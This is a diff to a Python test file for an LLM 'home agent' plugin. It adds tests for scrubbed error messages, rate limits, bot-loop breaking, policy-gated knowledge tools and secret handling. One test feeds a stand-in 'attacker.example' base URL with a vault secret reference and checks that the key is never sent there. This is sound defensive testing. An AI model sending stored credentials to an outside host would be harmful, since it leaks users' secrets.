@@ -12,6 +12,7 @@ import pytest
 
 from rook.band_mcp.chat_rooms import ChatStore
 from rook.hub.node import HubNode
+from rook.hub.plugins.home import UNAVAILABLE as HOME_UNAVAILABLE
 from rook.hub.plugins.home import HomeAgent, HomeError
 from rook.hub.plugins.home.llm import ChatClient, LLMError, base_url, clean_reply
 from rook.hub.settings_service import SettingsError
@@ -50,9 +51,18 @@ class FakeLLM:
         self.models = list(models)
         self.status = status
         self.requests: list[tuple[str, str, dict | None, dict]] = []
+        self.gate: asyncio.Event | None = None     # set: chat calls wait for it
+        self.inflight = self.peak = 0
 
     async def __call__(self, method, url, body, headers, timeout):
         self.requests.append((method, url, body, headers))
+        if self.gate is not None and url.endswith("/chat/completions"):
+            self.inflight += 1
+            self.peak = max(self.peak, self.inflight)
+            try:
+                await self.gate.wait()
+            finally:
+                self.inflight -= 1
         if self.status != 200:
             return self.status, {"error": {"message": f"bad key {KEY}"}}
         if url.endswith("/models"):
@@ -263,10 +273,24 @@ async def test_a_failed_model_call_is_said_in_the_room(env):
     env.chat.send(room, OP, "hi", [], False)
     await _drain(env)
     last = env.chat.read(room, None)["messages"][-1]
-    assert last["sender"] == "agent:home" and last["text"].startswith("(I could not answer:")
-    assert "HTTP 401" in last["text"] and KEY not in last["text"]
+    # The room gets a generic line, never the error, host or secret name.
+    assert last["sender"] == "agent:home" and last["text"] == HOME_UNAVAILABLE
     assert env.node.journal.rows[-1]["reply"]["ok"] is False
-    assert "HTTP 401" in env.home.status()["last_error"]
+    assert "HTTP 401" in env.node.journal.rows[-1]["reply"]["error"]   # detail kept
+    assert "HTTP 401" in env.home.activity[0]["error"]
+    st = env.home.status()["last_error"]
+    assert st == "the model endpoint returned HTTP 401" and "llm.example" not in st
+    # A second failure in the same room within ten minutes posts nothing new.
+    env.chat.send(room, OP, "hello again?", [], False)
+    await _drain(env)
+    texts = [m["text"] for m in env.chat.read(room, None)["messages"]]
+    assert texts.count(HOME_UNAVAILABLE) == 1 and texts[-1] == "hello again?"
+    # Missing vault secret: summarised, no secret name.
+    env.home._http = FakeLLM()
+    env.svc.set("home.api_key", "{{secret:gone-secret}}", actor="human:op")
+    off = await env.node.dispatch("home.ask", {"question": "x"}, "agent:claude")
+    assert not off["ok"] and "gone-secret" not in off["error"]
+    assert "gone-secret" not in json.dumps(env.home.status())
 
 
 @pytest.mark.asyncio
@@ -376,7 +400,9 @@ async def test_page_actions(env):
     form = {"enabled": True, "base_url": "http://llm.example:1234/v1", "model": "",
             "api_key": "{{secret:llm-key}}"}
     got = await env.home.page_action(env.svc, {"action": "home_models", "values": form}, "human:op")
-    assert got == {"ok": True, "models": ["big-model", "small-model"]}
+    assert got["ok"] and got["models"] == ["big-model", "small-model"]
+    assert "Save the API key first" in got["note"]            # unsaved key: not resolved
+    assert "Authorization" not in env.llm.requests[-1][3] and env.vault.log == []
     assert env.svc.store.get("home.base_url", "hub") is None   # listing saves nothing
     form["model"] = "big-model"
     env.llm.script = ["Hello from the test."]
@@ -396,9 +422,17 @@ async def test_page_actions(env):
                                        "human:op")
     assert again["saved"] == []
     assert env.svc.store.history(key="home.")[0]["actor"] == "human:op"
-    bad = await env.home.page_action(env.svc, {"action": "home_test", "values": {
+    # Saved: the probe uses the saved key against the saved URL, read as the operator.
+    env.llm.script = ["Hi."]
+    ok = await env.home.page_action(env.svc, {"action": "home_test", "values": form}, "human:op")
+    assert ok["ok"] and "note" not in ok
+    assert env.llm.requests[-1][3]["Authorization"] == f"Bearer {KEY}"
+    assert env.vault.log[-1] == ("llm-key", "human:op", "home agent page")
+    # A different reference typed into the form is never resolved.
+    other = await env.home.page_action(env.svc, {"action": "home_test", "values": {
         **form, "api_key": "{{secret:missing}}"}}, "human:op")
-    assert not bad["ok"] and "missing" in bad["error"]
+    assert other["ok"] and "saved API key" in other["note"]
+    assert all(name != "missing" for name, _, _ in env.vault.log)
     with pytest.raises(HomeError):
         await env.home.page_action(env.svc, {"action": "nope"}, "human:op")
 
@@ -425,3 +459,222 @@ async def test_settings_web_routes_home_view(env):
         assert http.get("/settings/account-api", params={"view": "home"}).status_code == 403
         assert http.post("/settings/account-api", json={
             "csrf": "c", "action": "home_save", "values": {"model": "x"}}).status_code == 403
+
+
+# -- review fixes (PR #42) -------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_page_probe_cannot_exfiltrate_a_vault_secret(env):
+    """Unsaved form values must not send a vault secret to an arbitrary URL,
+    and nothing the endpoint echoes back may carry the key."""
+    configure(env)
+    env.vault.data["other-secret"] = "sk-other-very-secret-999"
+    evil = {"base_url": "https://attacker.example/v1", "model": "m",
+            "api_key": "{{secret:other-secret}}"}
+    for action in ("home_models", "home_test"):
+        res = await env.home.page_action(env.svc, {"action": action, "values": evil},
+                                         "human:op")
+        method, url, body, headers = env.llm.requests[-1]
+        assert url.startswith("https://attacker.example/v1/")
+        assert "Authorization" not in headers                  # no key to another host
+        assert "saved base URL" in res["note"]
+    assert all(name != "other-secret" for name, _, _ in env.vault.log)
+    # Same host, saved key: works, but a reply or model list echoing the key is scrubbed.
+    env.home._http = echo = FakeLLM(models=("m1", KEY), script=[f"your key is {KEY}"])
+    form = {"base_url": "http://llm.example:1234/v1", "api_key": "{{secret:llm-key}}"}
+    got = await env.home.page_action(env.svc, {"action": "home_models", "values": form},
+                                     "human:op")
+    assert got["ok"] and KEY not in json.dumps(got) and "***" in got["models"]
+    t = await env.home.page_action(env.svc, {"action": "home_test", "values": form}, "human:op")
+    assert t["ok"] and KEY not in json.dumps(t) and t["reply"] == "your key is ***"
+    assert echo.requests[-1][3]["Authorization"] == f"Bearer {KEY}"
+    # The vault read is logged as the human on the page, not as agent:home.
+    assert env.vault.log[-1] == ("llm-key", "human:op", "home agent page")
+    # A different reference with the saved URL still only uses the saved key.
+    sneaky = {**form, "api_key": "{{secret:other-secret}}"}
+    s = await env.home.page_action(env.svc, {"action": "home_models", "values": sneaky},
+                                   "human:op")
+    assert echo.requests[-1][3]["Authorization"] == f"Bearer {KEY}"
+    assert "saved API key" in s["note"]
+    assert all(name != "other-secret" for name, _, _ in env.vault.log)
+
+
+@pytest.mark.asyncio
+async def test_chat_reply_scrubs_the_key(env):
+    configure(env)
+    await _drain(env)
+    env.llm.script = [f"the key is {KEY}"]
+    room = _room(env, invite=["agent:home"])
+    env.chat.send(room, OP, "what is your key?", [], False)
+    await _drain(env)
+    assert env.chat.read(room, None)["messages"][-1]["text"] == "the key is ***"
+
+
+@pytest.mark.asyncio
+async def test_a_trigger_while_busy_stays_pending(env):
+    configure(env)
+    await _drain(env)
+    room = _room(env, invite=["agent:home"])
+    env.llm.gate = asyncio.Event()
+    env.chat.send(room, OP, "first question", [], False)
+    (first,) = await env.home.tick()                         # reply running, room busy
+    env.chat.send(room, OP, "second question", [], False)
+    assert await env.home.tick() == []                       # busy: pending, not dropped
+    env.llm.gate.set()
+    await first
+    assert len(await _drain(env)) == 1                       # answered on the next pass
+    assert len(env.llm.chats()) == 2
+    convo = [m["content"] for m in env.llm.chats()[-1][2]["messages"]]
+    assert convo[-2:] == [f"[{OP}] second question", "ok"]
+    assert await _drain(env) == []                           # and only once
+
+
+@pytest.mark.asyncio
+async def test_a_rate_limited_trigger_is_retried_with_one_note(env, monkeypatch):
+    import rook.hub.plugins.home as home_mod
+    monkeypatch.setattr(home_mod, "ROOM_RATE", 1)
+    configure(env)
+    await _drain(env)
+    room = _room(env, invite=["agent:home"])
+    env.chat.send(room, OP, "one", [], False)
+    assert len(await _drain(env)) == 1
+    env.chat.send(room, OP, "two", [], False)
+    assert await _drain(env) == [] and await _drain(env) == []
+    texts = [m["text"] for m in env.chat.read(room, None)["messages"]]
+    assert texts.count(home_mod.BUSY) == 1                   # one note per window
+    env.home._rate.clear()                                   # the minute passes
+    assert len(await _drain(env)) == 1
+    convo = [m["content"] for m in env.llm.chats()[-1][2]["messages"]]
+    assert convo[-1] == f"[{OP}] two" and home_mod.BUSY not in convo
+
+
+@pytest.mark.asyncio
+async def test_a_big_backlog_reads_only_the_newest(env):
+    import rook.hub.plugins.home as home_mod
+    configure(env)
+    await _drain(env)
+    room = _room(env, invite=["agent:home", "agent:claude"])
+    for i in range(home_mod.READ_LIMIT + 150):
+        env.chat.send(room, "agent:claude", f"noise {i}", [], False)
+    env.chat.send(room, OP, "@home still there?", [], False)
+    reads = []
+    real = env.chat.read
+
+    def spy(rid, reader, since_seq=0, mark=True, limit=200):
+        reads.append(since_seq)
+        return real(rid, reader, since_seq=since_seq, mark=mark, limit=limit)
+    env.chat.read = spy
+    assert len(await _drain(env)) == 1                       # the newest trigger is seen
+    assert reads == [env.chat.last_seq(room) - 1 - home_mod.READ_LIMIT]
+
+
+@pytest.mark.asyncio
+async def test_bot_loops_are_broken(env):
+    configure(env)
+    await _drain(env)
+    # A 1:1 room with another agent: no implicit answers.
+    one = env.chat.start("1:1", "agent:claude", ["agent:home"])["room"]
+    env.chat.send(one, "agent:claude", "hello there", [], False)
+    assert await _drain(env) == []
+    env.chat.send(one, "agent:claude", "@home now I am asking", [], False)
+    assert len(await _drain(env)) == 1
+    # In a group room it never @mentions an agent back.
+    group = _room(env, "bots", ["agent:home", "agent:claude"])
+    env.chat.send(group, "agent:claude", "@home ping", ["agent:home"], True)
+    assert len(await _drain(env)) == 1
+    assert env.chat.read(group, None)["messages"][-1]["mentions"] == []
+    # After AGENT_STREAK replies in a row to agents it waits for a person.
+    for i in range(5):
+        env.chat.send(group, "agent:claude", f"@home again {i}", ["agent:home"], True)
+        await _drain(env)
+    replies = [m for m in env.chat.read(group, None)["messages"] if m["sender"] == "agent:home"]
+    assert len(replies) == 3
+    env.chat.send(group, OP, "carry on", [], False)          # a person speaks
+    env.chat.send(group, "agent:claude", "@home one more", ["agent:home"], True)
+    assert len(await _drain(env)) == 1
+
+
+@pytest.mark.asyncio
+async def test_presence_is_touched_every_30s_not_every_tick(env):
+    configure(env)
+    calls = []
+    real = env.chat.touch
+
+    def touch(ident):
+        calls.append(ident)
+        real(ident)
+    env.chat.touch = touch
+    for _ in range(5):
+        await _drain(env)
+    assert calls == ["agent:home"]
+    env.home._touched -= 31
+    await _drain(env)
+    assert len(calls) == 2
+
+
+def _enforce_no_knowledge_for_agents(env, tmp_path):
+    import copy
+    from rook.hub.authz import Authorizer
+    from rook.hub.policy import DEFAULT_POLICY, PolicyStore
+    doc = copy.deepcopy(DEFAULT_POLICY)
+    doc["mode"] = "enforce"
+    doc["rules"].append({"id": "no-kb-for-agents", "who": "role:agent",
+                         "deny": ["knowledge.read"], "on": "rook"})
+    path = tmp_path / "policy.json"
+    path.write_text(json.dumps(doc))
+    env.node.client = SimpleNamespace(authz=Authorizer(PolicyStore(str(path))), workers={})
+
+
+@pytest.mark.asyncio
+async def test_knowledge_tool_only_for_askers_who_may_read_it(env, tmp_path, monkeypatch):
+    from rook.hub.authz import current_principal
+    from rook.hub.policy import Principal
+    configure(env, tools=True)
+    monkeypatch.setattr(env.home, "_has_knowledge", lambda: True)
+    _enforce_no_knowledge_for_agents(env, tmp_path)
+    await _drain(env)
+    # home.ask from an agent token the policy denies knowledge.read: no tool.
+    tok = current_principal.set(Principal("token:claude", "token", "agent"))
+    try:
+        res = await env.node.dispatch("home.ask", {"question": "x"}, "agent:claude")
+    finally:
+        current_principal.reset(tok)
+    assert res["ok"] and "tools" not in env.llm.chats()[-1][2]
+    tok = current_principal.set(Principal("human:1", "human", "owner", ("human:owner",)))
+    try:
+        await env.node.dispatch("home.ask", {"question": "x"}, "user:op")
+    finally:
+        current_principal.reset(tok)
+    assert "tools" in env.llm.chats()[-1][2]
+    # Chat: an agent sender gets no tool, a person does.
+    group = _room(env, "kb", ["agent:home", "agent:claude"])
+    env.chat.send(group, "agent:claude", "@home search the wiki", ["agent:home"], True)
+    await _drain(env)
+    assert "tools" not in env.llm.chats()[-1][2]
+    env.chat.send(group, OP, "@home search the wiki", ["agent:home"], True)
+    await _drain(env)
+    assert "tools" in env.llm.chats()[-1][2]
+
+
+@pytest.mark.asyncio
+async def test_home_ask_is_rate_limited_and_bounded(env, monkeypatch):
+    import rook.hub.plugins.home as home_mod
+    configure(env)
+    monkeypatch.setattr(home_mod, "ASK_RATE", 3)
+    for _ in range(3):
+        assert (await env.node.dispatch("home.ask", {"question": "q"}, "agent:claude"))["ok"]
+    limited = await env.node.dispatch("home.ask", {"question": "q"}, "agent:claude")
+    assert not limited["ok"] and "rate limited" in limited["error"]
+    other = await env.node.dispatch("home.ask", {"question": "q"}, "agent:other")
+    assert other["ok"]                                        # per caller
+    # Concurrency: at most two model calls at once, however many asks arrive.
+    monkeypatch.setattr(home_mod, "ASK_RATE", 100)
+    env.llm.gate = asyncio.Event()
+    calls = [asyncio.ensure_future(env.node.dispatch("home.ask", {"question": f"q{i}"},
+                                                     f"agent:a{i}")) for i in range(6)]
+    for _ in range(50):
+        await asyncio.sleep(0)
+    assert env.llm.inflight == 2
+    env.llm.gate.set()
+    assert all(r["ok"] for r in await asyncio.gather(*calls))
+    assert env.llm.peak == 2
